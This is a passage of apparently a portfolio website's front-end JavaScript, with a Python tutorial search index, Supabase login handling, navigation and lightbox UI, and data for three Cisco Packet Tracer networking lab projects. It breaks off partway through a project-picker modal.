    { title: "break, continue, pass", desc: "Break - Exit loop. — for i in range ( 10 ): if i == 5 : break print (i); for i in range ( 10 ): if i % 2 == 0 : continue print (i); for i in range ( 5 ): pass; for i in range ( 5 ): if i == 10 : break else : print ( \"No break occurred\" )", id: "loops-break-continue-pass" },
    { title: "List Comprehension", desc: "Traditional method. — squares = [] for x in range ( 10 ): squares.append(x ** 2 ); squares = [x ** 2 for x in range ( 10 )]; evens = [x for x in range ( 20 ) if x % 2 == 0 ]; labels = [ \"even\" if x % 2 == 0 else \"odd\" for x in range ( 10 )]; matrix = [[i * j for j in range ( 1 , 4…", id: "comprehensions-list-comprehension" },
    { title: "Dictionary Comprehension", desc: "Build dictionary. — names = [ \"\" , \"\" , \"\" ]; name_lengths = {name: len (name) for name in names}; long_names = {name: len (name) for name in names if len (name) > 3 }; original = { \"a\" : 1 , \"b\" : 2 , \"c\" : 3 } reversed_dict = {v: k for k, v in original.items()}", id: "comprehensions-dictionary-comprehension" },
    { title: "Set Comprehension", desc: "Set Comprehension. — numbers = [ 1 , 2 , 2 , 3 , 3 , 3 , 4 ]; unique_squares = {x ** 2 for x in numbers}; sum_of_squares = sum (x ** 2 for x in range ( 1000000 ))", id: "comprehensions-set-comprehension" },
    { title: "Creation and Access", desc: "List. — fruits = [ \"\" , \"And\" , \"\" , \"And\" ]; numbers = list ( range ( 5 )); empty = []; mixed = [ 1 , \"hello\" , 3.14 , True ]; print (fruits[ 0 ]); print (fruits[ -1 ])", id: "lists-creation-and-access" },
    { title: "List Methods", desc: "Sorting. — numbers = [ 3 , 1 , 4 , 1 , 5 , 9 , 2 , 6 ]; numbers.sort() numbers.sort(reverse= True ); words = [ \"banana\" , \"pie\" , \"Washington\" ] words.sort(key= len ); new_sorted = sorted (numbers, reverse= True ); shallow = numbers.copy() shallow = numbers[:] shallow =…", id: "lists-list-methods" },
    { title: "Creation and Access", desc: "Dictionary. — person = { \"name\" : \"\" , \"age\" : 25 , \"city\" : \"\" }; person2 = dict (name= \"\" , age= 30 ); print (person[ \"name\" ]) print (person.get( \"age\" )) print (person.get( \"job\" , \"N/A\" )); person[ \"email\" ] = \"ali@example.com\" person.update({ \"phone\" : \"0912...\" ,…", id: "dicts-creation-and-access" },
    { title: "Advanced dictionaries", desc: "Defaultdict. — from collections import defaultdict; word_count = defaultdict( int ) for word in [ \"apple\" , \"banana\" , \"apple\" ]: word_count[word] += 1 print (word_count); from collections import Counter; counts = Counter([ \"a\" , \"b\" , \"a\" , \"c\" , \"a\" ]) print…", id: "dicts-advanced-dictionaries" },
    { title: "Creation and Formatting", desc: "F-string (And Python 3.6+) — name = \"\"; age = 25; message = f\"Hello {name}And {age} \"; pi = 3.14159265359; print ( f\"Pi = {pi:.2f}\" ); print ( f\"Pi = {pi:10.4f}\" )", id: "strings-creation-and-formatting" },
    { title: "String Methods", desc: "String Slicing. — text = \"Hello, World!\"; print (text[ 0 : 5 ]); print (text[ 7 :]); print (text[:: 2 ]); print (text[:: -1 ]); print ( \"123\" .isnumeric())", id: "strings-string-methods" },
    { title: "Function Definition", desc: "Simple. — def greet (name): \"\"\"Greeting the user.\"\"\" return f\"Hello {name}!\"; def power (base, exponent= 2 ): return base ** exponent; print ( power ( 3 )) print ( power ( 2 , 3 )); def flexible (*args, **kwargs): print ( \"Positional:\" , args) print ( \"Keyword:\" ,…", id: "functions-function-definition" },
    { title: "Docstrings", desc: "Access docstring. — def calculate_area (length, width): \"\"\"Calculate rectangle area. Args: length (float): Rectangle length. width (float): Rectangle width. Returns: float: Calculated area. Raises: ValueError: If length or width is negative. Examples: >>> calculate_area(5, 3)…", id: "functions-docstrings" },
    { title: "Basic Decorator", desc: "Decorator. — def my_decorator (func): def wrapper (*args, **kwargs): print ( \"Before function\" ) result = func(*args, **kwargs) print ( \"After function\" ) return result return wrapper; @my_decorator def say_hello (): print ( \"Hello!\" ); say_hello (); def repeat (times):…", id: "decorators-basic-decorator" },
    { title: "Class Decorators", desc: "@property. — class Circle : def __init__ (self, radius): self._radius = radius @property def radius (self): return self._radius @radius.setter def radius (self, value): if value 0 : raise ValueError( \"Radius cannot be negative\" ) self._radius = value @property def area…", id: "decorators-class-decorators" },
    { title: "Package Structure", desc: "Usage:; import mypackage.module1; from mypackage.subpackage import module3. — mypackage/ __init__.py module1.py module2.py subpackage/ __init__.py module3.py", id: "modules-package-structure" },
    { title: "Class Definition", desc: "Object. — class Dog : species = \"Canis familiaris\" def __init__ (self, name, age): self.name = name self.age = age def description (self): return f\"{self.name} is {self.age} years old\" def speak (self, sound): return f\"{self.name} says {sound}\" def __str__ (self):…", id: "classes-class-definition" },
    { title: "Class Methods and Static Methods", desc: "class Person : population = 0 def __init__ (self, name): self.name = name Person.population += 1 @classmethod def get_population (cls): return cls.population @classmethod def create_anonymous (cls): return cls( \"Anonymous\" ) @staticmethod def is_adult (age):…", id: "classes-class-methods-and-static-methods" },
    { title: "Multiple Inheritance", desc: "MRO Inheritance. — class Flyable : def fly (self): return \"Flying!\"; class Swimmable : def swim (self): return \"Swimming!\"; class Duck (Flyable, Swimmable): def quack (self): return \"Quack!\"; duck = Duck () print (duck.fly()) print (duck.swim()) print (duck.quack()); print…", id: "inheritance-multiple-inheritance" },
    { title: "File Modes", desc: "Reading entire file. — with open ( \"data.txt\" , \"r\" , encoding= \"utf-8\" ) as f: content = f.read() print (content); with open ( \"data.txt\" , \"r\" , encoding= \"utf-8\" ) as f: for line in f: print (line.strip()); with open ( \"data.txt\" , \"r\" , encoding= \"utf-8\" ) as f: lines =…", id: "file-io-file-modes" },
    { title: "CSV", desc: "Reading CSV. — import csv; with open ( \"data.csv\" , \"r\" , encoding= \"utf-8\" ) as f: reader = csv.reader(f) header = next (reader) for row in reader: print (row); with open ( \"data.csv\" , \"r\" , encoding= \"utf-8\" ) as f: reader = csv.DictReader(f) for row in reader: print…", id: "csv-json-csv" },
    { title: "JSON", desc: "Convert to JSON (serialize). — import json; data = { \"name\" : \"\" , \"age\" : 25 , \"skills\" : [ \"Python\" , \"Linux\" ], \"active\" : True }; json_str = json.dumps(data, ensure_ascii= False , indent= 2 ) print (json_str); with open ( \"data.json\" , \"w\" , encoding= \"utf-8\" ) as f: json.dump(data, f,…", id: "csv-json-json" }
  ]
};

/* ---------- Auth & Global UI ---------- */
async function checkUserSession() {
  try {
    const { data: { session } } = await SUPABASE.auth.getSession();
    if (session) {
      await loadUserProfile(session.user.id, session.user.email);
    } else {
      updateAuthUI(null, null);
    }
  } catch (err) {
    // Session check failed (e.g. network/Supabase issue) — still show the login button
    updateAuthUI(null, null);
  }
}

async function loadUserProfile(userId, email) {
  try {
    const { data } = await SUPABASE
      .from('profiles')
      .select('username, avatar_url, first_name')
      .eq('id', userId)
      .single();
    updateAuthUI(data, email);
  } catch (err) {
    updateAuthUI(null, email);
  }
}

function updateAuthUI(profile, email) {
  const authUserMenu = document.getElementById('globalAuthMenu');
  if (!authUserMenu) return;

  if (!profile && !email) {
    authUserMenu.innerHTML = '<a href="/login/login.html">Sign in</a>';
  } else {
    const username = profile?.first_name || profile?.username || email.split('@')[0];
    const avatar = profile?.avatar_url;
    const initial = username[0].toUpperCase();

    authUserMenu.classList.add('authenticated');
    authUserMenu.innerHTML = `
      <div class="user-profile-icon" title="${escapeHtml(username)}">
        <button type="button" class="avatar-btn" id="profileMenuBtn" aria-label="User menu" aria-haspopup="true" aria-expanded="false">
          ${avatar ? `<img src="${escapeHtml(avatar)}" alt="${escapeHtml(username)}" style="width:100%;height:100%;object-fit:cover;">` : `<span>${escapeHtml(initial)}</span>`}
        </button>
        <div class="profile-dropdown" id="profileDropdown" role="menu">
          <div class="dropdown-header">
            <div class="dropdown-avatar">
              ${avatar ? `<img src="${escapeHtml(avatar)}" alt="${escapeHtml(username)}">` : `<span>${escapeHtml(initial)}</span>`}
            </div>
            <div class="dropdown-user-info">
              <p class="dropdown-username">${escapeHtml(username)}</p>
              <p class="dropdown-email">${escapeHtml(email)}</p>
            </div>
          </div>
          <div class="dropdown-divider"></div>
          <a href="/profile.html" class="dropdown-item" role="menuitem">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
            Profile
          </a>
          <div class="dropdown-divider"></div>
          <button type="button" id="signOutDropdownBtn" class="dropdown-item dropdown-logout" role="menuitem">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"></path><polyline points="16 17 21 12 16 7"></polyline><line x1="21" y1="12" x2="9" y2="12"></line></svg>
            Sign Out
          </button>
        </div>
      </div>
    `;

    const profileMenuBtn = document.getElementById('profileMenuBtn');
    const profileDropdown = document.getElementById('profileDropdown');

    profileMenuBtn?.addEventListener('click', (e) => {
      e.stopPropagation();
      const isOpen = profileDropdown.classList.toggle('open');
      profileMenuBtn.setAttribute('aria-expanded', isOpen);
    });

    document.addEventListener('click', (e) => {
      if (!authUserMenu.contains(e.target)) {
        profileDropdown?.classList.remove('open');
        profileMenuBtn?.setAttribute('aria-expanded', 'false');
      }
    });

    document.getElementById('signOutDropdownBtn')?.addEventListener('click', async (e) => {
      e.preventDefault();
      await SUPABASE.auth.signOut();
      location.reload();
    });
  }
}

function escapeHtml(text) {
  if (!text) return '';
  const div = document.createElement('div');
  div.textContent = text;
  return div.innerHTML;
}

/* ---------- Navigation & Search ---------- */
function updateActiveNav() {
  const page = document.documentElement.getAttribute('data-page');
  const path = window.location.pathname;
  const navLinks = document.querySelectorAll('.nav-link, .dropdown-trigger');

  navLinks.forEach(link => {
    link.classList.remove('active');
    const href = link.getAttribute('href');
    if (href && (href === path || (page && href.includes(`${page}.html`)))) {
      link.classList.add('active');
    }
  });
}

function populateNetLabMenu() {
  const menu = document.getElementById('netLabLinks');
  if (!menu) return;

  // Keep the 'Home' link, add project links
  const homeLink = `<a href="network_lab.html">Home</a>`;
  const projectLinks = PROJECTS.map(p => `
    <a href="project.html?id=${p.id}">${escapeHtml(p.title)}</a>
  `).join('');

  menu.innerHTML = homeLink + projectLinks;
}

function handleGlobalSearch() {
  const input = document.getElementById('globalSearchInput');
  const resultsDiv = document.getElementById('globalSearchResults');
  if (!input || !resultsDiv) return;

  input.addEventListener('input', () => {
    const query = input.value.toLowerCase().trim();
    if (!query) {
      resultsDiv.innerHTML = '';
      return;
    }

    let allResults = [];
    for (const [page, index] of Object.entries(pageSearchIndexes)) {
      const filtered = index.filter(item =>
        item.title.toLowerCase().includes(query) ||
        item.desc.toLowerCase().includes(query)
      ).map(item => ({ ...item, page }));
      allResults = allResults.concat(filtered);
    }

    if (allResults.length === 0) {
      resultsDiv.innerHTML = '<div class="search-result-item"><span class="result-title">No results found</span></div>';
    } else {
      resultsDiv.innerHTML = allResults.map(item => `
        <div class="search-result-item" onclick="navigateTo('${item.id}', '${item.page}')">
          <div class="result-meta">${item.page.toUpperCase()}</div>
          <span class="result-title">${escapeHtml(item.title)}</span>
          <span class="result-desc">${escapeHtml(item.desc)}</span>
        </div>
      `).join('');
    }
  });
}

function navigateTo(id, page) {
  const currentPage = document.documentElement.getAttribute('data-page');
  closeHeaderSearch();

  if (currentPage === page) {
    const element = document.getElementById(id);
    if (element) {
      element.scrollIntoView({ behavior: 'smooth', block: 'start' });
    }
  } else {
    window.location.href = `${page}.html#${id}`;
  }
}

function closeHeaderSearch() {
  const panel = document.getElementById('navSearchPanel');
  const btn = document.getElementById('globalSearchBtn');
  const input = document.getElementById('globalSearchInput');
  if (panel) {
    panel.classList.remove('open');
    panel.setAttribute('aria-hidden', 'true');
  }
  btn?.setAttribute('aria-expanded', 'false');
  if (input && window.innerWidth > 1024) input.value = '';
}

function setupGlobalUIToggles() {
  // Mobile Menu
  const mobileToggle = document.getElementById('mobileToggle');
  const navMenu = document.getElementById('navMenu');
  let scrollPosition = 0;
  
  // Helper function to close menu
  const closeMenu = () => {
    if (navMenu && navMenu.classList.contains('open')) {
      navMenu.classList.remove('open');
      if (mobileToggle) mobileToggle.classList.remove('open');
      document.body.classList.remove('menu-open');
      window.scrollTo(0, scrollPosition);
    }
  };
  
  if (mobileToggle && navMenu) {
    mobileToggle.addEventListener('click', () => {
      const isOpen = navMenu.classList.toggle('open');
      mobileToggle.classList.toggle('open', isOpen);
      document.body.classList.toggle('menu-open', isOpen);
      
      // Prevent scroll-to-top on mobile (save position, restore after close)
      if (isOpen) {
        scrollPosition = window.scrollY;
      } else {
        window.scrollTo(0, scrollPosition);
      }
    });
  }

  // Search: inline header dropdown on desktop, always-open bar on mobile
  const searchBtn = document.getElementById('globalSearchBtn');
  const searchPanel = document.getElementById('navSearchPanel');
  const closeSearchBtn = document.getElementById('closeSearchBtn');
  if (searchBtn && searchPanel) {
    searchBtn.addEventListener('click', (e) => {
      e.stopPropagation();
      const isOpen = searchPanel.classList.toggle('open');
      searchPanel.setAttribute('aria-hidden', String(!isOpen));
      searchBtn.setAttribute('aria-expanded', String(isOpen));
      if (isOpen) document.getElementById('globalSearchInput')?.focus();
    });
  }
  if (closeSearchBtn) {
    closeSearchBtn.addEventListener('click', () => closeHeaderSearch());
  }
  document.addEventListener('click', (e) => {
    if (window.innerWidth > 1024 && !e.target.closest('#navSearch')) {
      closeHeaderSearch();
    }
  });
  document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape' && searchPanel?.classList.contains('open')) {
      closeHeaderSearch();
    }
  });

  // Dropdown menus (Projects / Network Lab / Documents) — click toggle.
  // Desktop still opens on hover via CSS; this fixes mobile/touch, where
  // hover never fires and the submenu items were unreachable.
  document.querySelectorAll('.dropdown-trigger').forEach(trigger => {
    trigger.addEventListener('click', (e) => {
      e.stopPropagation();
      const item = trigger.closest('.nav-item');
      if (!item) return;
      const wasOpen = item.classList.contains('open');
      document.querySelectorAll('.nav-item.open').forEach(el => {
        if (el !== item) el.classList.remove('open');
      });
      item.classList.toggle('open', !wasOpen);
    });
  });
  document.addEventListener('click', (e) => {
    if (!e.target.closest('.nav-item')) {
      document.querySelectorAll('.nav-item.open').forEach(el => el.classList.remove('open'));
    }
  });

  // Closing the mobile menu should also collapse any open dropdown, and
  // clear the search bar, inside it.
  if (mobileToggle && navMenu) {
    mobileToggle.addEventListener('click', () => {
      if (!navMenu.classList.contains('open')) {
        document.querySelectorAll('.nav-item.open').forEach(el => el.classList.remove('open'));
        const input = document.getElementById('globalSearchInput');
        const results = document.getElementById('globalSearchResults');
        if (input) input.value = '';
        if (results) results.innerHTML = '';
      }
    });
  }

  // Close menu automatically when clicking a navigation link (mobile)
  document.addEventListener('click', (e) => {
    if (mobileToggle && navMenu && navMenu.classList.contains('open')) {
      const link = e.target.closest('#navMenu a:not([data-toggle])');
      if (link) {
        closeMenu();
      }
    }
  });

  // Close menu when clicking on overlay/backdrop (mobile)
  document.addEventListener('click', (e) => {
    if (mobileToggle && navMenu && navMenu.classList.contains('open')) {
      // If click is outside the menu and the toggle, close it
      if (!e.target.closest('#navMenu') && !e.target.closest('#mobileToggle')) {
        closeMenu();
      }
    }
  });

  // Close menu with Escape key (mobile)
  document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape' && navMenu && navMenu.classList.contains('open')) {
      closeMenu();
    }
  });
}

/* ---------- Project data ---------- */


const PROJECTS = [
  {
    id: 'p1',
    num: '01',
    title: 'Setting Up an Internal Network',
    tagline: 'Cisco Packet Tracer · Internal Network',
    lead: 'A complete end-to-end simulation of an internal office network. The scenario covers switch and router configuration, DHCP addressing on a dedicated server, mixing DHCP and static clients, default routing to an upstream router, and end-to-end connectivity tests from every PC to the gateway and the simulated Internet.',
    cover: 'images/p1_01.webp',
    images: ['images/p1_01.webp', 'images/p1_05.webp'],
    tags: ['DHCP', 'VLAN', 'Routing', 'Switching', 'End-to-End Test', 'Internal LAN'],
    tools: [
      { icon: 'PT', name: 'Cisco Packet Tracer', desc: 'Network simulation & testing' },
      { icon: 'DH', name: 'DHCP', desc: 'Automatic client addressing' },
      { icon: 'VL', name: 'VLAN', desc: 'Network segmentation & isolation' },
      { icon: 'RT', name: 'Routing', desc: 'Inter-VLAN & default routes' },
      { icon: 'SW', name: 'Switching', desc: 'Access & trunk ports' },
      { icon: 'TC', name: 'Ping / Test', desc: 'Connectivity verification' },
    ],
    stats: [
      { value: '2', label: 'Routers' },
      { value: '1', label: 'Switch' },
      { value: '1', label: 'Server' },
      { value: '3', label: 'PCs' },
    ],
    downloads: [
      { type: 'pkt', label: 'Packet Tracer Project', desc: 'Open the complete Cisco Packet Tracer topology.', file: 'downloads/p1_network.pkt' },
      { type: 'doc', label: 'Project Report', desc: 'Full explanation, addressing, commands, tests and final result.', file: 'downloads/p1_internal_network_report.docx' },
    ],
  },
  {
    id: 'p2',
    num: '02',
    title: 'Tehran University LAN Scenario',
    tagline: 'Cisco Packet Tracer · University LAN',
    lead: 'A realistic university campus LAN scenario. Multiple faculties are connected through departmental routers and a backbone router, each with its own DHCP pool and static routes between them. ACLs are added to restrict traffic between departments, and full end-to-end tests prove that any faculty can reach any other faculty - or not, depending on the policy.',
    cover: 'images/p2_01.webp',
    images: ['images/p2_01.webp', 'images/p2_03.webp', 'images/p2_05.webp', 'images/p2_07.webp'],
    tags: ['DHCP', 'Static Routing', 'ACLs', 'VLAN', 'Campus LAN', 'Multi-Router'],
    tools: [
      { icon: 'PT', name: 'Cisco Packet Tracer', desc: 'Network simulation & testing' },
      { icon: 'DH', name: 'DHCP', desc: 'Per-department pools' },
      { icon: 'SR', name: 'Static Routing', desc: 'Manual path configuration' },
      { icon: 'AC', name: 'ACLs', desc: 'Per-department traffic filtering' },
      { icon: 'VL', name: 'VLAN', desc: 'Department segmentation' },
      { icon: 'RT', name: 'Routers', desc: 'Multi-router topology' },
    ],
    stats: [
      { value: '3', label: 'Routers' },
      { value: '2', label: 'Switches' },
      { value: '2', label: 'PCs' },
      { value: '2', label: 'Departments' },
    ],
    downloads: [
      { type: 'pkt', label: 'Packet Tracer Project', desc: 'Open the complete university LAN topology.', file: 'downloads/p2_lan_university.pkt' },
      { type: 'doc', label: 'Project Report', desc: 'Full scenario walkthrough, configurations, ACLs and tests.', file: 'downloads/p2_university_lan_report.docx' },
    ],
  },
  {
    id: 'p3',
    num: '03',
    title: 'Connecting to Google Web Server',
    tagline: 'Cisco Packet Tracer · End-to-End Internet',
    lead: 'A complete end-to-end simulation of a browser reaching www.google.com. The chain inside Packet Tracer: DHCP leases for the client PCs, DNS resolution on the simulated Google DNS server, PAT/NAT on the edge router so private IPs can reach the public Internet, and a real HTTP and HTTPS request to the simulated Google Web Server.',
    cover: 'images/p3_05.webp',
    images: ['images/p3_01.webp', 'images/p3_05.webp'],
    tags: ['DHCP', 'DNS', 'Routing', 'Default Route', 'NAT / PAT', 'TCP / HTTPS'],
    tools: [
      { icon: 'PT', name: 'Cisco Packet Tracer', desc: 'Network simulation & testing' },
      { icon: 'DH', name: 'DHCP', desc: 'Automatic client addressing' },
      { icon: 'DN', name: 'DNS', desc: 'Domain name resolution' },
      { icon: 'RT', name: 'Routing', desc: 'Static & default routing' },
      { icon: 'NP', name: 'NAT / PAT', desc: 'Inside-to-outside translation' },
      { icon: 'TC', name: 'TCP / HTTPS', desc: 'Application traffic testing' },
    ],
    stats: [
      { value: '3', label: 'PCs' },
      { value: '2', label: 'Routers' },
      { value: '1', label: 'Switch' },
      { value: '2', label: 'Servers' },
    ],
    downloads: [
      { type: 'pkt', label: 'Packet Tracer Project', desc: 'Open the complete Cisco Packet Tracer topology.', file: 'downloads/p3_google_webserver.pkt' },
      { type: 'doc', label: 'Project Report', desc: 'Full explanation, addressing, commands, tests and final result.', file: 'downloads/p3_google_webserver_report.docx' },
    ],
  },
];

/* ---------- Helpers ---------- */
const $ = (sel, root = document) => root.querySelector(sel);
const $$ = (sel, root = document) => Array.from(root.querySelectorAll(sel));
const escape = (s = '') => String(s).replace(/[&<>"']/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));

function getParam(name) {
  return new URLSearchParams(window.location.search).get(name);
}

/* ---------- Lightbox ---------- */
const lightboxState = { images: [], index: 0 };

function openLightbox(images, index, caption) {
  lightboxState.images = images;
  lightboxState.index = index;
  const lb = $('#lightbox');
  if (!lb) return;
  $('#lightboxImg').src = images[index];
  $('#lightboxImg').alt = caption || '';
  $('#lightboxCaption').textContent = caption || `Image ${index + 1} of ${images.length}`;
  lb.classList.add('open');
  lb.setAttribute('aria-hidden', 'false');
  document.body.style.overflow = 'hidden';
}

function closeLightbox() {
  const lb = $('#lightbox');
  if (!lb) return;
  lb.classList.remove('open');
  lb.setAttribute('aria-hidden', 'true');
  document.body.style.overflow = '';
}

function lightboxStep(dir) {
  if (!lightboxState.images.length) return;
  const len = lightboxState.images.length;
  lightboxState.index = (lightboxState.index + dir + len) % len;
  $('#lightboxImg').src = lightboxState.images[lightboxState.index];
  $('#lightboxCaption').textContent = `Image ${lightboxState.index + 1} of ${len}`;
}

function setupLightbox() {
  $('#lightboxClose')?.addEventListener('click', closeLightbox);
  $('#lightboxPrev')?.addEventListener('click', () => lightboxStep(-1));
  $('#lightboxNext')?.addEventListener('click', () => lightboxStep(1));
  $('#lightbox')?.addEventListener('click', (e) => { if (e.target.id === 'lightbox') closeLightbox(); });
  document.addEventListener('keydown', (e) => {
    const lb = $('#lightbox');
    if (!lb || !lb.classList.contains('open')) return;
    if (e.key === 'Escape') closeLightbox();
    if (e.key === 'ArrowLeft') lightboxStep(-1);
    if (e.key === 'ArrowRight') lightboxStep(1);
  });

  // Touch swipe support (mobile): swipe left/right to navigate, swipe down to close
  const lb = $('#lightbox');
  if (lb) {
    let touchStartX = 0, touchStartY = 0, touchActive = false;
    lb.addEventListener('touchstart', (e) => {
      if (e.touches.length !== 1) return;
      touchStartX = e.touches[0].clientX;
      touchStartY = e.touches[0].clientY;
      touchActive = true;
    }, { passive: true });
    lb.addEventListener('touchend', (e) => {
      if (!touchActive) return;
      touchActive = false;
      const dx = e.changedTouches[0].clientX - touchStartX;
      const dy = e.changedTouches[0].clientY - touchStartY;
      const absX = Math.abs(dx), absY = Math.abs(dy);
      const SWIPE_THRESHOLD = 40;
      if (absY > absX && dy > 60) { closeLightbox(); return; }
      if (absX > absY && absX > SWIPE_THRESHOLD) {
        if (dx < 0) lightboxStep(1); else lightboxStep(-1);
      }
    }, { passive: true });
  }
}

/* ---------- Smooth scroll for anchor links ---------- */
function setupSmoothScroll() {
  $$('a[href^="#"]').forEach(a => {
    a.addEventListener('click', e => {
      const href = a.getAttribute('href');
      if (href === '#' || href.length < 2) return;
      const el = document.querySelector(href);
      if (el) {
        e.preventDefault();
        el.scrollIntoView({ behavior: 'smooth', block: 'start' });
      }
    });
  });
}

/* ============================================================
   INDEX PAGE — render project grid
   ============================================================ */
function renderProjectsIndex() {
  const grid = $('#projectsGrid');
  if (!grid) return;
  $('#projectCount').textContent = `${PROJECTS.length} projects`;

  grid.innerHTML = PROJECTS.map(p => `
    <a class="project-tile" href="project.html?id=${p.id}" data-id="${p.id}">
      <div class="project-tile-cover">
        <span class="project-tile-num">PROJECT ${p.num}</span>
        <span class="project-tile-count">${p.images.length} screenshots</span>
        <img src="${p.cover}" alt="${escape(p.title)}" loading="lazy">
      </div>
      <div class="project-tile-body">
        <h3>${escape(p.title)}</h3>
        <p>${escape(p.lead)}</p>
        <div class="project-tile-tags">
          ${p.tags.slice(0, 4).map(t => `<span>${escape(t)}</span>`).join('')}
          ${p.tags.length > 4 ? `<span>+${p.tags.length - 4}</span>` : ''}
        </div>
        <div class="project-tile-cta">
          <span>View project</span>
          <span class="arrow">→</span>
        </div>
      </div>
    </a>
  `).join('');
}

/* ============================================================
   PROJECT PAGE — render single project
   ============================================================ */
function renderProjectPage() {
  const id = getParam('id') || 'p1';
  const project = PROJECTS.find(p => p.id === id) || PROJECTS[0];

  // Title and meta
  document.title = `${project.title} — Network Lab | Amirali Gholian`;
  $('#crumbProject').textContent = `Project ${project.num} — ${project.title}`;
  $('#projectTagline').textContent = project.tagline;
  $('#projectTitle').textContent = project.title;
  $('#projectLead').textContent = project.lead;

  // Stats
  $('#projectStats').innerHTML = project.stats.map(s => `
    <div><strong>${s.value}</strong><small>${s.label}</small></div>
  `).join('');

  // Tags
  $('#projectTags').innerHTML = project.tags.map(t => `<span>${escape(t)}</span>`).join('');

  // Cover
  $('#coverImg').src = project.cover;
  $('#coverImg').alt = project.title;
  $('#coverCaption').textContent = `Cover image · ${project.images.length} screenshots total — click any image to enlarge`;
  $('#imageCount').textContent = `${project.images.length} screenshots`;

  // Gallery
  $('#galleryGrid').innerHTML = project.images.map((src, i) => `
    <div class="gallery-item" data-index="${i}">
      <span class="gallery-num">${String(i + 1).padStart(2, '0')}</span>
      <img src="${src}" alt="${escape(project.title)} screenshot ${i + 1}" loading="lazy">
    </div>
  `).join('');

  // Open lightbox on cover click
  $('#coverImg')?.addEventListener('click', () => openLightbox(project.images, 0, `${project.title} — cover`));

  // Open lightbox on gallery click
  $$('.gallery-item').forEach(item => {
    item.addEventListener('click', () => {
      const i = parseInt(item.dataset.index, 10) || 0;
      openLightbox(project.images, i, `${project.title} — image ${i + 1}/${project.images.length}`);
    });
  });

  // Tools (rendered as clickable cards; clicking opens picker if shared with other projects)
  const skillIndex = buildSkillProjectsIndex();
  const toolsGrid = $('#toolsGrid');
  toolsGrid.dataset.currentProject = project.id;
  toolsGrid.innerHTML = project.tools.map(t => {
    const skillKey = normalizeSkillName(t.name);
    const ids = skillIndex[skillKey] || [project.id];
    const href = `project.html?id=${project.id}`;
    const isShared = ids.length > 1;
    return `
    <a class="tool-card${isShared ? ' is-shared' : ''}" href="${href}" data-skill="${escape(skillKey)}" data-projects="${ids.join(',')}">
      <span class="tool-icon">${t.icon}</span>
      <div>
        <h3>${escape(t.name)}</h3>
        <p>${escape(t.desc)}</p>
        <small>${isShared ? `Used in ${ids.length} projects · choose →` : `Only in this project`}</small>
      </div>
    </a>`;
  }).join('');

  // Downloads
  $('#downloadGrid').innerHTML = project.downloads.map(d => `
    <a class="download-card" href="${d.file}" download>
      <span class="file-type ${d.type}">.${d.type.toUpperCase()}</span>
      <div>
        <h3>${escape(d.label)}</h3>
        <p>${escape(d.desc)}</p>
      </div>
      <span class="arrow">↗</span>
    </a>
  `).join('');

  // Other projects
  const others = PROJECTS.filter(p => p.id !== project.id);
  $('#moreGrid').innerHTML = others.map(p => `
    <a class="more-card" href="project.html?id=${p.id}">
      <img src="${p.cover}" alt="${escape(p.title)}">
      <div>
        <h3>${escape(p.title)}</h3>
        <small>${p.images.length} screenshots · ${p.downloads.length} files</small>
      </div>
      <span class="arrow">→</span>
    </a>
  `).join('');
}

/* ============================================================
   SKILL INDEX — map normalized skill name → list of project ids
   Built once from PROJECTS so each tool card knows if it's shared.
   ============================================================ */
function normalizeSkillName(name) {
  return String(name || '').toLowerCase().trim();
}

function buildSkillProjectsIndex() {
  const idx = {};
  PROJECTS.forEach(p => {
    (p.tools || []).forEach(t => {
      const key = normalizeSkillName(t.name);
      if (!idx[key]) idx[key] = [];
      if (!idx[key].includes(p.id)) idx[key].push(p.id);
    });
  });
  return idx;
}

/* ============================================================
   TOAST — non-blocking notification (replaces alert())
   ============================================================ */
const Toast = {
  container: null,
  ensure() {
    if (this.container) return this.container;
    this.container = $('#toastContainer');
    if (!this.container) {
      this.container = document.createElement('div');
      this.container.id = 'toastContainer';
      this.container.className = 'toast-container';
      this.container.setAttribute('aria-live', 'polite');
      this.container.setAttribute('aria-atomic', 'true');
      document.body.appendChild(this.container);
    }
    return this.container;
  },
  show(message, type = 'info', duration = 3200) {
    const c = this.ensure();
    const toast = document.createElement('div');
    toast.className = `toast ${type}`;
    toast.setAttribute('role', 'status');
    const icon = type === 'success' ? '✓' : type === 'error' ? '⚠' : 'ℹ';
    toast.innerHTML = `<span class="toast-icon">${icon}</span><span class="toast-msg">${escape(message)}</span>`;
    c.appendChild(toast);
    requestAnimationFrame(() => toast.classList.add('show'));
    setTimeout(() => {
      toast.classList.remove('show');
      setTimeout(() => toast.remove(), 350);
    }, duration);
  }
};

/* ============================================================
   PICKER MODAL — multi-project skills
   Works on both index and project pages.
   - Shared skill (ids.length > 1) → open picker so user can switch project
   - Single-project skill:
       · on index page → navigate to that project's page
       · on project page → toast "Only used in this project"
   ============================================================ */
function setupSkillPicker() {
  const picker = $('#picker');
  const onProjectPage = !!$('#projectTitle') || document.body.classList.contains('page-project');

  const titleEl  = picker ? $('#pickerTitle')  : null;
  const subEl    = picker ? $('#pickerSub')    : null;
  const listEl   = picker ? $('#pickerList')   : null;
  const closeBtn = picker ? $('#pickerClose')  : null;

  function openPicker(skillName, projectIds) {
    if (!picker) return;
    // Try to detect the current project from the project page (if any)
    const toolsGrid = $('#toolsGrid');
    const currentProjectId = toolsGrid ? toolsGrid.dataset.currentProject : null;

    if (titleEl) titleEl.textContent = `${skillName}  -  choose a project`;
    if (subEl) {
      if (currentProjectId && projectIds.includes(currentProjectId)) {
        subEl.textContent = `This skill is used in ${projectIds.length} projects. Your current project is highlighted below.`;
      } else {
        subEl.textContent = `This skill is used in ${projectIds.length} projects. Pick the one you want to open.`;
      }
    }
    if (listEl) {
      listEl.innerHTML = projectIds.map(id => {
        const proj = PROJECTS.find(p => p.id === id);
        if (!proj) return '';
        const isCurrent = currentProjectId === proj.id;
        return `
          <a class="picker-item${isCurrent ? ' is-current' : ''}" href="project.html?id=${proj.id}" data-id="${proj.id}">
            <span class="picker-item-num">${proj.num}</span>
            <div class="picker-item-body">
